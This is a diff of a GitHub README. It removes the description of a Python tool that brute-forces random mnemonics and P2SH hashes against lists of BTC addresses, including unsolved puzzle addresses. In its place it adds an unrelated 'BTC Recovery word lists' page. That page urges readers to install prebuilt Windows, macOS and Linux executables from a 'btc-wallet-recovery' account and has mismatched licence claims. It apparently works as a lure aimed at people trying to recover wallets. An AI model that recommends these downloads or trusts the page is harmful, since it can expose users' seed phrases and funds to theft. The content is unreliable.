@@ -1,66 +1,102 @@
-# btc_words
-Search Mnemonic words for BTC address (offline check in file). Python3 implementation Using _multi cpu_.
-The script could be helpful to target the BTC Puzzle Transaction >100 BTC unsolved currently. 
+<div align="center">
+<img src="assets/banner-hub.png" alt="BTC Recovery word lists">
+</div>
 
-# Info
-The script generate randomly the English Mnemonic words and calculates the BTC derivation path BTC address and compare them in the input btc address file. If match is found the script will stop and print the corresponding mnemonic words on screen along with the matching btc Address.
+<h1 align="center">BTC Recovery word lists</h1>
 
-Default Value used, can be changed if required. Currently they are set to make 12 words, using 4 cpu and checking the first address only in the derived path of the words.
-```
-cores=4
-entropy_bits = 128                      # [128, 160, 192, 224, 256]
-derivation_total_path_to_check = 1      # default = 1
-```
-_entropy_bits_to_mnemonic_ function can be modified if any other language words are needed. Currenly the default is English Words only.
+<p align="center">The vocabulary a seed-phrase search actually has to work through.</p>
 
-# p2sh
-The script p2sh_brute, try to operate on only HASH160 collision where p2sh address could be redeemed using the correct redeem script. It avoids the EC operation of privatekey -> Pubkey.
+<div align="center">
+<a href="LICENSE"><img src="https://img.shields.io/badge/LICENSE-GPL--2.0-FCB036?style=for-the-badge&labelColor=191008" alt="License: GPL-2.0"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1"><img src="https://img.shields.io/badge/RELEASE-v2.1.1-FCB036?style=for-the-badge&labelColor=191008" alt="Release v2.1.1"></a>
+</div>
 
-# Run
-```
-(base) C:\anaconda3>python bip44_words_mcpu.py
-[+] Starting.........Wait.....
-[+] Loaded 256 address from file: btc_address.txt
-Starting thread:  2
-Starting thread:  1
-Starting thread:  3
-Starting thread:  0
-[+] Total Keys Checked : 7247  [ Speed : 915.38 Keys/s ]  Current words: tooth slot lion flip cruise vibrant peace bone keen task turn crouch
-[+] Total Keys Checked : 7308  [ Speed : 916.11 Keys/s ]  Current words: talent long toilet coil stove bring machine enforce drip gate front remind
-[+] Total Keys Checked : 7808  [ Speed : 913.70 Keys/s ]  Current words: pattern cave school daring sting talk daughter then assume position humor custom
-[+] Total Keys Checked : 8034  [ Speed : 916.18 Keys/s ]  Current words: grab swamp ginger popular broken modify thing fiscal agent drama wine question
-[+] Total Keys Checked : 8047  [ Speed : 913.15 Keys/s ]  Current words: rich quit until enemy rough cute minor boss napkin practice tiger kit
-[+] Total Keys Checked : 8112  [ Speed : 915.64 Keys/s ]  Current words: apple coyote edge demise goat garbage journey inch diet chicken outdoor glory
-[+] Total Keys Checked : 8534  [ Speed : 915.75 Keys/s ]  Current words: select captain alarm dish damage next flag detect good tenant trade burger
-[+] Total Keys Checked : 8834  [ Speed : 914.81 Keys/s ]  Current words: rebuild bacon talent fragile renew report angle resemble scene toward dignity soda
-[+] Total Keys Checked : 8882  [ Speed : 917.98 Keys/s ]  Current words: brave version music earn marble artefact option index pilot lift excite juice
-[+] Total Keys Checked : 8952  [ Speed : 918.53 Keys/s ]  Current words: stove hood lemon daughter icon deputy share erupt keen alcohol tiger imitate
-[+] Total Keys Checked : 9339  [ Speed : 917.99 Keys/s ]  Current words: wolf august pause canyon claw witness height announce sing night swallow choose
-[+] Total Keys Checked : 9612  [ Speed : 917.32 Keys/s ]  Current words: spoon occur virtual verify dumb guard marble dice crack trend alcohol narrow
-[+] Total Keys Checked : 9713  [ Speed : 919.82 Keys/s ]  Current words: hunt online under quality spin govern flavor faculty thing loop law endorse
-[+] Total Keys Checked : 9752  [ Speed : 919.14 Keys/s ]  Current words: goat tiny betray assist diesel discover mutual praise trick skin fluid lend
-[+] Total Keys Checked : 10155  [ Speed : 916.69 Keys/s ]  Current words: thumb neither twenty claim ethics ice check coast near away lawn scorpion
-[+] Total Keys Checked : 10376  [ Speed : 914.74 Keys/s ]  Current words: tide test approve elite slice cake scrap palace intact drastic hurt prevent
-[+] Total Keys Checked : 10492  [ Speed : 916.79 Keys/s ]  Current words: panther mixture candy fitness unable report find moment distance dose usual rhythm
+<div align="center">
+<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
+</div>
 
+<div align="center">
 
-(base) C:\anaconda3>python seed_puzzle.py
-BIP44 Searched Mnemonics : 150800   with Total Derivation Path 20 to 30 each
-SIGINT or CTRL-C detected. Exiting gracefully. BYE
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
+| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
+| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |
 
-(base) C:\anaconda3>python p2sh_brute.py
+</div>
 
-[+] Program Starting ... Please Wait
-[+] Loaded 7644366 p2sh Address.   Last: 3GrRsA9sRXMPeTnsGHK223sCmRgzethGDZ
-100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 7644366/7644366 [01:20<00:00, 95086.76it/s]
-[+] Converted back to HASH160 bytes and loaded in a SET...
-[Completed    100200000]  [238399.81 Key/s]  Script=       0014a635ba8a5ad714fc001411e50cca70484cf872b9
-SIGINT or CTRL-C detected. Exiting gracefully. BYE
-```
+The list decides the size of every search you will read about here.
 
-# Tips
-```
-BTC:	bc1q39meky2mn5qjq704zz0nnkl0v7kj4uz6r529at
-ETH:	0xa74fC23f07A33B90d6848dF0bb409bEA5Ac16b28
-DOGE:	D5Wh5bQMc3XVGdLbjJbGjryjNom5tZY6dD
-```
+> Only download from this GitHub release page.
+
+## What this repository is for
+
+This repository is where the word-list side of BTC Recovery is kept. A seed phrase is drawn from a fixed list of 2,048 words, and every unknown position in a recovery is a question about one entry in that list, which is why the arithmetic of a search is so predictable and why a single mistyped word changes the entire wallet. Understanding that list is what turns a hopeless situation into a bounded one. The pages here support the recovery guides rather than replacing them: they explain the vocabulary, the checksum that the last word carries, and the difference between a word that is wrong and a word that is simply not in the list. For the search itself, the seed-phrase guides are the place to start.
+
+## Who it is for
+
+- You want to know why one wrong word changes every address the wallet produces.
+- You are checking whether a word you remember is even part of the standard list.
+- You are building a candidate list and need to know what the vocabulary allows.
+
+## Start here
+
+- The seed-phrase guides explain how the list is used in a search.
+- The invalid-phrase guide covers a word the wallet refuses.
+- The missing-words guide covers positions you do not know.
+
+## How to use these guides
+
+1. Establish the word count first, because it fixes the list and the checksum length.
+2. Check each doubtful word against the standard list before treating it as unknown.
+3. Feed the result into the matching seed-phrase guide rather than searching by hand.
+
+## The guides, grouped
+
+Four guides put the vocabulary to work.
+
+| Guide | What it answers |
+| --- | --- |
+| [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md) | BTCRecover fills the gaps, tests each candidate against an address that belongs to the wallet, and does it all offline on your own machine. |
+| [Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md) | BTCRecover finds the offending word locally by testing substitutions against the phrase's own checksum and then against an address from the wallet. |
+| [What a recovery phrase is, and what it is not](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/what-is-a-recovery-phrase-btcrecover.md) | A recovery phrase is a human-writable encoding of a wallet's master key: 12 to 24 words that regenerate every key and address the wallet ever used. |
+| [You forgot which wallet software you used](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/forgot-which-wallet-software-btcrecover.md) | Identify the family first  -  recovery method, word list and derivation all follow from it. |
+
+## What each guide changes
+
+| Your situation | Guide | What you end up with |
+| --- | --- | --- |
+| A recovery that needs a plan | The seed phrase guides | A search small enough to run, checked against one address. |
+| A wallet file with no password | The wallet file guides | Candidates tested against a copy of the file, offline. |
+| A download you want to check | The tool guides | The published checksum and the file that matches it. |
+
+## Common first questions
+
+### How many words are in the list?
+
+2,048, which is why one unknown word is a short job and three unknown words is a much larger one.
+
+### Can a phrase use words outside the list?
+
+Not a standard BIP39 phrase. A wallet from an older or different system may, and the legacy-format guide covers that case.
+
+### Why does one wrong word change every address?
+
+Because the wallet derives all of its keys from the whole phrase in order, so a single substitution changes the input to every key it produces.
+
+## Before you install
+
+Install the current release before you use any of this, and treat the word list as reference material rather than a search tool. The vocabulary is fixed, the checksum is fixed, and the only variable in a recovery is what you can prove about the wallet. Keep the address you are checking against somewhere you can read it without opening the wallet itself.
+
+## About
+
+The word-list pages exist because the arithmetic of a seed-phrase recovery is the arithmetic of this list. Once you know that one unknown position is 2,048 questions and that a second unknown multiplies it again, the difference between a short job and an impossible one stops being a mystery. The seed-phrase guides take that understanding and turn it into a run.
+
+## License
+
+These word lists ship under the GPL-3.0 licence, with the complete terms in [LICENSE](LICENSE).
+
+---
+
+**BTC Recovery word lists** - one page of the BTC Recovery account.
+
+Links: [the profile](https://github.com/btc-wallet-recovery/btc-wallet-recovery) - [the application](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software) - [the seed phrase guides](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery) - [the wallet file guides](https://github.com/btc-wallet-recovery/btcrecover-password-recovery) - [the tool guides](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool).
